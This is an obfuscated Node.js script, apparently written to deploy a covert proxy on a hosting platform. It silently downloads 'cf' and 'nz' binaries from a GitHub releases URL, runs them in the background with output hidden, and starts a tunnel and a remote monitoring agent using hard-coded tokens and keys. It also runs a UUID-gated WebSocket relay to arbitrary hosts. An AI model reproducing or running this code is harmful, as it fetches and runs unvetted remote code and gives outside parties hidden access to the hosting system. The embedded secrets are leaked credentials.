const uuid = (process.env.UUID || '7090ff5d-f321-4248-a7c3-d8837f124999').replace(/-/g, "");
const port = process.env.PORT || 8080;
const NZ_SERVER = process.env.NZ_SERVER || 'nz.seav.eu.org:443';
const NZ_KEY = process.env.NZ_KEY || 'JLFXd0MpsVpFzvZozC';
const AGO_AUTH = process.env.AGO_AUTH || 'eyJhIjoiZjAzMGY1ZDg4OGEyYmRlN2NiMDg3NTU5MzM4ZjE0OTciLCJ0IjoiZjNmOGFlMmItZjVmZi00MjUxLWJiYTMtZWRlYjg0NDc5ZDFlIiwicyI6IlpEUXhZVE5qWmpJdFlUWTBOeTAwTkRKa0xXRXhOMlF0TUdSalkySmlaakZrTjJOaSJ9';


const _0x535040=_0x57bd;(function(_0x2a88bc,_0x54bf29){const _0x393cc9=_0x57bd,_0x5b29af=_0x2a88bc();while(!![]){try{const _0x2fd198=-parseInt(_0x393cc9(0x11b))/0x1*(-parseInt(_0x393cc9(0x12f))/0x2)+-parseInt(_0x393cc9(0x11d))/0x3*(parseInt(_0x393cc9(0x141))/0x4)+-parseInt(_0x393cc9(0x11e))/0x5*(-parseInt(_0x393cc9(0x131))/0x6)+-parseInt(_0x393cc9(0x124))/0x7*(-parseInt(_0x393cc9(0x13d))/0x8)+-parseInt(_0x393cc9(0x138))/0x9*(-parseInt(_0x393cc9(0x15a))/0xa)+-parseInt(_0x393cc9(0x142))/0xb+parseInt(_0x393cc9(0x11f))/0xc*(-parseInt(_0x393cc9(0x122))/0xd);if(_0x2fd198===_0x54bf29)break;else _0x5b29af['push'](_0x5b29af['shift']());}catch(_0x2d0bdb){_0x5b29af['push'](_0x5b29af['shift']());}}}(_0x48a8,0xd3804));const os=require('os'),fs=require('fs'),axios=require(_0x535040(0x12e)),path=require(_0x535040(0x12d)),net=require(_0x535040(0x14f)),{exec,spawn,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),logcb=(..._0x16ecde)=>console[_0x535040(0x14c)][_0x535040(0x14d)](this,..._0x16ecde),errcb=(..._0x28bdb2)=>console['error']['bind'](this,..._0x28bdb2);function _0x48a8(){const _0x785273=['send','alzLY','data','once','nz\x20is\x20running','482bHyeet','arm64','1407vSqgqK','55NeYvWF','12DYtYlo','Error\x20running\x20nz:\x20','https://github.com/seav1/dl/releases/download/src/','22570847rJTCbG','cf\x20is\x20running','21AfYmhS','fileName','readUInt16BE','nz-arm','stream','Connect-Err:','gigpR','arch','WebSocket\x20Error:','path','axios','7018ufdMze','VtFum','301836pzcwog','E2:','reduce','error','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','\x20failed:\x20','SSNsq','63eNRXtM','length','\x20>/dev/null\x202>&1\x20&','map','FLces','1823896fXLbBC','chmod\x20+x\x20cf\x20nz\x20&&\x20./cf\x20tunnel\x20--edge-ip-version\x20auto\x20--protocol\x20http2\x20run\x20--token\x20','write','connected\x20successfully','4480dKGiQe','14102484CyWSAw','Download\x20','arm','connection','pipe','listening:','toString','every','finish','E1:','log','bind','readUInt8','net','\x20successfully','amd','slice','haLOw','Error\x20running\x20cf:\x20','message','connect','chmod\x20+x\x20nz\x20&&\x20./nz\x20-s\x20','Server','join','2115980BSRhKd','cf-arm','existsSync','fileUrl','then'];_0x48a8=function(){return _0x785273;};return _0x48a8();}function getSystemArchitecture(){const _0x120902=_0x535040,_0x4b2650=os[_0x120902(0x12b)]();return _0x4b2650==='arm'||_0x4b2650===_0x120902(0x11c)?_0x120902(0x144):_0x120902(0x151);}function downloadFile(_0x3272ad,_0x5a5d87){const _0x3f6cfd=_0x535040,_0x25c965=path['join']('./',_0x3272ad),_0x2533a5=fs['createWriteStream'](_0x25c965);return axios({'method':'get','url':_0x5a5d87,'responseType':_0x3f6cfd(0x128)})['then'](_0x2cf2f7=>{const _0x339568=_0x3f6cfd;return _0x2cf2f7[_0x339568(0x161)][_0x339568(0x146)](_0x2533a5),new Promise((_0x1716b4,_0x4f5e43)=>{const _0x194940=_0x339568;_0x2533a5['on'](_0x194940(0x14a),_0x1716b4),_0x2533a5['on'](_0x194940(0x134),_0x4f5e43);});});}async function downloadFiles(){const _0x5703cf=_0x535040,_0x5a83a0=getSystemArchitecture(),_0x13b8c9=getFilesForArchitecture(_0x5a83a0);if(_0x13b8c9[_0x5703cf(0x139)]===0x0){console['log'](_0x5703cf(0x135));return;}for(const _0x3df637 of _0x13b8c9){if(!fs[_0x5703cf(0x15c)](_0x3df637[_0x5703cf(0x125)]))try{await downloadFile(_0x3df637[_0x5703cf(0x125)],_0x3df637[_0x5703cf(0x15d)]),console[_0x5703cf(0x14c)]('Download\x20'+_0x3df637[_0x5703cf(0x125)]+_0x5703cf(0x150));}catch(_0x8a73da){if(_0x5703cf(0x137)!==_0x5703cf(0x153))console['log'](_0x5703cf(0x143)+_0x3df637[_0x5703cf(0x125)]+_0x5703cf(0x136)+_0x8a73da[_0x5703cf(0x155)]);else{const _0x554341=_0x4c8fbd[_0x5703cf(0x12b)]();return _0x554341===_0x5703cf(0x144)||_0x554341===_0x5703cf(0x11c)?_0x5703cf(0x144):_0x5703cf(0x151);}}}}function getFilesForArchitecture(_0x15316b){const _0x2a7d4f=_0x535040,_0x2069c9=_0x2a7d4f(0x121),_0x1722b5=_0x15316b==='amd'?['cf','nz']:[_0x2a7d4f(0x15b),_0x2a7d4f(0x127)];return _0x1722b5['map'](_0xfa5f77=>({'fileName':_0xfa5f77,'fileUrl':_0x2069c9+_0xfa5f77}));}downloadFiles()[_0x535040(0x15e)](()=>{const _0x3e16ed=_0x535040;exec(_0x3e16ed(0x13e)+AGO_AUTH+_0x3e16ed(0x13a),_0x53ad36=>{const _0x40a42d=_0x3e16ed;_0x40a42d(0x130)==='tqRvJ'?_0x711e97[_0x40a42d(0x14c)](_0x40a42d(0x143)+_0x35c0a8[_0x40a42d(0x125)]+_0x40a42d(0x136)+_0x55c96b['message']):_0x53ad36?console[_0x40a42d(0x134)](_0x40a42d(0x154)+_0x53ad36):console[_0x40a42d(0x14c)](_0x40a42d(0x123));}),exec(_0x3e16ed(0x157)+NZ_SERVER+'\x20-p\x20'+NZ_KEY+'\x20--tls\x20>\x20/dev/null\x202>&1\x20&',_0x425fce=>{const _0x5ecd89=_0x3e16ed;_0x425fce?console[_0x5ecd89(0x134)](_0x5ecd89(0x120)+_0x425fce):_0x5ecd89(0x160)!==_0x5ecd89(0x13c)?console['log'](_0x5ecd89(0x11a)):_0x27603b[_0x5ecd89(0x14c)](_0x5ecd89(0x123));});});const ws=new WebSocket[(_0x535040(0x158))]({'port':port},logcb(_0x535040(0x147),port));function _0x57bd(_0x446fb4,_0x3fe592){const _0x48a827=_0x48a8();return _0x57bd=function(_0x57bd9a,_0x2bb711){_0x57bd9a=_0x57bd9a-0x11a;let _0x29ad55=_0x48a827[_0x57bd9a];return _0x29ad55;},_0x57bd(_0x446fb4,_0x3fe592);}ws['on'](_0x535040(0x145),_0x36442d=>{const _0x4a257e=_0x535040;console[_0x4a257e(0x14c)](_0x4a257e(0x140)),_0x36442d[_0x4a257e(0x162)](_0x4a257e(0x155),_0x208a51=>{const _0x1c3694=_0x4a257e;if(_0x1c3694(0x12a)==='gigpR'){const [_0x182c94]=_0x208a51,_0x2114fc=_0x208a51[_0x1c3694(0x152)](0x1,0x11);if(!_0x2114fc[_0x1c3694(0x149)]((_0x5ec608,_0x1ddde1)=>_0x5ec608==parseInt(uuid['substr'](_0x1ddde1*0x2,0x2),0x10)))return;let _0x49645c=_0x208a51['slice'](0x11,0x12)[_0x1c3694(0x14e)]()+0x13;const _0x55b9fd=_0x208a51[_0x1c3694(0x152)](_0x49645c,_0x49645c+=0x2)[_0x1c3694(0x126)](0x0),_0x3166e4=_0x208a51[_0x1c3694(0x152)](_0x49645c,_0x49645c+=0x1)['readUInt8'](),_0x550da4=_0x3166e4==0x1?_0x208a51[_0x1c3694(0x152)](_0x49645c,_0x49645c+=0x4)[_0x1c3694(0x159)]('.'):_0x3166e4==0x2?new TextDecoder()['decode'](_0x208a51[_0x1c3694(0x152)](_0x49645c+0x1,_0x49645c+=0x1+_0x208a51[_0x1c3694(0x152)](_0x49645c,_0x49645c+0x1)[_0x1c3694(0x14e)]())):_0x3166e4==0x3?_0x208a51[_0x1c3694(0x152)](_0x49645c,_0x49645c+=0x10)[_0x1c3694(0x133)]((_0xa8e195,_0x4429f6,_0x499efd,_0x32c793)=>_0x499efd%0x2?_0xa8e195['concat'](_0x32c793[_0x1c3694(0x152)](_0x499efd-0x1,_0x499efd+0x1)):_0xa8e195,[])[_0x1c3694(0x13b)](_0x579e86=>_0x579e86[_0x1c3694(0x126)](0x0)[_0x1c3694(0x148)](0x10))[_0x1c3694(0x159)](':'):'';logcb('Connect:',_0x550da4,_0x55b9fd),_0x36442d[_0x1c3694(0x15f)](new Uint8Array([_0x182c94,0x0]));const _0x411776=createWebSocketStream(_0x36442d);net[_0x1c3694(0x156)]({'host':_0x550da4,'port':_0x55b9fd},function(){const _0x507625=_0x1c3694;this[_0x507625(0x13f)](_0x208a51[_0x507625(0x152)](_0x49645c)),_0x411776['on'](_0x507625(0x134),errcb(_0x507625(0x14b)))[_0x507625(0x146)](this)['on'](_0x507625(0x134),errcb('E2:'))[_0x507625(0x146)](_0x411776);})['on'](_0x1c3694(0x134),errcb(_0x1c3694(0x129),{'host':_0x550da4,'port':_0x55b9fd}));}else this[_0x1c3694(0x13f)](_0x3fe334[_0x1c3694(0x152)](_0x63e31c)),_0xc4ea81['on'](_0x1c3694(0x134),_0x9e7a4e(_0x1c3694(0x14b)))[_0x1c3694(0x146)](this)['on'](_0x1c3694(0x134),_0x2eb60e(_0x1c3694(0x132)))[_0x1c3694(0x146)](_0x38ccfd);})['on'](_0x4a257e(0x134),errcb(_0x4a257e(0x12c)));});
